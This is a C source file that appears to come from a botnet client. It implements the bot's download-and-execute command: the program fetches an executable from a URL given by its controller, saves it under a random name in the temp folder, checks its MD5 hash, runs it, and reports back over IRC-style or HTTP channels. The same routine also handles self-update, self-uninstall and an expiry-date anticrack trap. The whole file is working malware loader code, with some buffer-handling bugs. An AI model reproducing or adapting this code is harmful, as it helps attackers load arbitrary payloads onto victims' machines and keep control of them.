#include "../Includes/includes.h"

DWORD WINAPI DownloadExecutableFile(LPVOID)
{
#ifdef HTTP_BUILD
    int nLocalTaskId = nCurrentTaskId;
#endif

#ifndef DEBUG
    srand(GenerateRandomSeed());

    char cDownloadFrom[DEFAULT];
    strcpy(cDownloadFrom, cDownloadFromLocation);

    char cExecutionArguments[DEFAULT];
    if(bExecutionArguments)
    {
        bExecutionArguments = FALSE;
        strcpy(cExecutionArguments, cStoreParameter);
    }
    else
        strcpy(cExecutionArguments, "N/A");

    char szLocalMd5Match[150];
    bool bMatchRequired = bMd5MustMatch;
    memset(szLocalMd5Match, 0, sizeof(szLocalMd5Match));
    if(bMd5MustMatch)
    {
        bMd5MustMatch = FALSE;
        strcpy(szLocalMd5Match, szMd5Match);

        memset(szMd5Match, 0, sizeof(szMd5Match));
    }

    bool bOutputMd5Hash = bGlobalOnlyOutputMd5Hash;
    if(bGlobalOnlyOutputMd5Hash)
        bGlobalOnlyOutputMd5Hash = FALSE;

    DWORD dwSecondsToWait = GetRandNum(dwStoreParameter);

    bool bDownloadUpdate = bUpdate;

#ifndef HTTP_BUILD
    SendDownloadScheduleNotification(dwSecondsToWait, (char*)cDownloadFrom, bDownloadUpdate);
#endif

    for(DWORD dw = 0; dw < dwSecondsToWait; dw++)
    {
        Sleep(1000);

        if(bDownloadAbort)
        {
            if(strstr(cStoreParameter, cDownloadFrom))
            {
#ifndef HTTP_BUILD
                SendDownloadAbort(dwSecondsToWait - dw, (char*)cDownloadFrom);
#endif
                bDownloadAbort = FALSE;
                return 0;
            }
        }
    }

    char cDownloadTo[MAX_PATH + strlen(cExecutionArguments) + 3];
    sprintf(cDownloadTo, "%s\\%s.exe", cTempDirectory, GenRandLCText());

    HANDLE hInternetOpen = InternetOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, NULL);
    if(hInternetOpen)
    {
        HANDLE hOpenUrl = InternetOpenUrl(hInternetOpen, cDownloadFrom, NULL, 0, 0, 0);
        if(hOpenUrl)
        {
            HANDLE hCreateFile = CreateFile(cDownloadTo, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
            if(hCreateFile < (HANDLE)1)
            {
#ifndef HTTP_BUILD
                SendFailedToWrite(cDownloadFrom);
#endif

                InternetCloseHandle(hOpenUrl);
                return 0;
            }

            DWORD dwBytesRead, dwBytesWrite;
            DWORD dwTotal = 0;

            do
            {
                char *cFileToBuffer = (char*)malloc(DOWNLOAD_MEMORY_SPACE);

                memset(cFileToBuffer, 0, sizeof(cFileToBuffer));
                InternetReadFile(hOpenUrl, cFileToBuffer, sizeof(cFileToBuffer), &dwBytesRead);

                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
                time_t tTime;
                struct tm *ptmTime;
                tTime = time(NULL);
                ptmTime = localtime(&tTime);
                char cTodaysDate[20];
                memset(cTodaysDate, 0, sizeof(cTodaysDate));
                strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
                if(atoi(cTodaysDate) >= nExpirationDateMedian)
                    strcpy(cFileToBuffer, GenRandLCText());
                // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

                WriteFile(hCreateFile, cFileToBuffer, dwBytesRead, &dwBytesWrite, NULL);

                if((dwTotal) < DOWNLOAD_MEMORY_SPACE)
                {
                    unsigned int uiBytesToCopy;
                    uiBytesToCopy = DOWNLOAD_MEMORY_SPACE - dwTotal;

                    if(uiBytesToCopy > dwBytesRead)
                        uiBytesToCopy = dwBytesRead;

                    memcpy(&cFileToBuffer[dwTotal], cFileToBuffer, uiBytesToCopy);
                }
                dwTotal += dwBytesRead;

                free(cFileToBuffer);
            }
            while(dwBytesRead > 0);

            CloseHandle(hCreateFile);
            InternetCloseHandle(hOpenUrl);

            if(FileExists(cDownloadTo))
            {
                char szMd5[150];
                memset(szMd5, 0, sizeof(szMd5));

                GetMD5Hash(cDownloadTo, szMd5, sizeof(szMd5));

                if(!strstr(cExecutionArguments, "N/A"))
                {
                    strcat(cDownloadTo, " ");
                    strcat(cDownloadTo, cExecutionArguments);
                }

                if(bDownloadUpdate)
                {
                    SetProgramMutex(cUpdateMutex);
                    bBotkill = FALSE;
                    Sleep(1000);
                }

                if(bOutputMd5Hash)
                {
#ifndef HTTP_BUILD
                    SendMd5Hash(cDownloadFrom, szMd5);
#endif
                    return 1;
                }
                else
                {
                    if(bMatchRequired)
                    {
                        if(strcmp(szMd5, szLocalMd5Match) != 0)
                        {
#ifndef HTTP_BUILD
                            SendMd5NotMatch(szMd5, szLocalMd5Match);
#endif

                            return 1;
                        }
                    }

                    char szThisFileMd5[150];
                    memset(szThisFileMd5, 0, sizeof(szThisFileMd5));
                    GetMD5Hash(cFileSaved, szThisFileMd5, sizeof(szThisFileMd5));
                    if(strcmp(szMd5, szThisFileMd5) == 0)
                    {
#ifndef HTTP_BUILD
                            SendMd5MatchesCurrent(szMd5, szThisFileMd5);
#endif

                            return 1;
                    }

                    if(StartProcessFromPath(cDownloadTo, FALSE))
                    {
                        if(bDownloadUpdate)
                        {
#ifndef HTTP_BUILD
                            UninstallForUpdate(szMd5);
#else
                            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                Sleep(10000);
#endif
                            bUninstallProgram = TRUE;
                        }
                        else
                        {
                            if(strstr(cExecutionArguments, "N/A"))
                            {
#ifndef HTTP_BUILD
                                SendDownloadAndExecuteSuccess(cDownloadFrom, szMd5);
#else
                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                    Sleep(10000);
#endif
                            }
                            else
                            {
#ifndef HTTP_BUILD
                                SendDownloadAndExecuteWithArgumentsSuccess(cDownloadFrom, cExecutionArguments, szMd5);
#else
                                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                                    Sleep(10000);
#endif
                            }
                        }
                    }
                    else
                    {
#ifndef HTTP_BUILD
                        SendDownloadSuccessAndExecuteFail(cDownloadFrom, szMd5);
#else
                        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                            Sleep(10000);
#endif
                    }
                }
            }
            else
            {
#ifndef HTTP_BUILD
                SendDownloadFail(cDownloadFrom);
#else
                while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                    Sleep(10000);
#endif
            }
        }
        else
        {
#ifndef HTTP_BUILD
            SendDownloadFail(cDownloadFrom);
#else
            while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
                Sleep(10000);
#endif
        }
    }
    else
    {
#ifndef HTTP_BUILD
        SendDownloadFail(cDownloadFrom);
#else
        while(!SendHttpCommandResponse(nLocalTaskId, (char*)"0"))
            Sleep(10000);
#endif
    }
#endif

    bGlobalOnlyOutputMd5Hash = FALSE;
    bMd5MustMatch = FALSE;
    bExecutionArguments = FALSE;
    bDownloadAbort = FALSE;
    bUpdate = FALSE;
    memset(szMd5Match, 0, sizeof(szMd5Match));

    return 1;
}
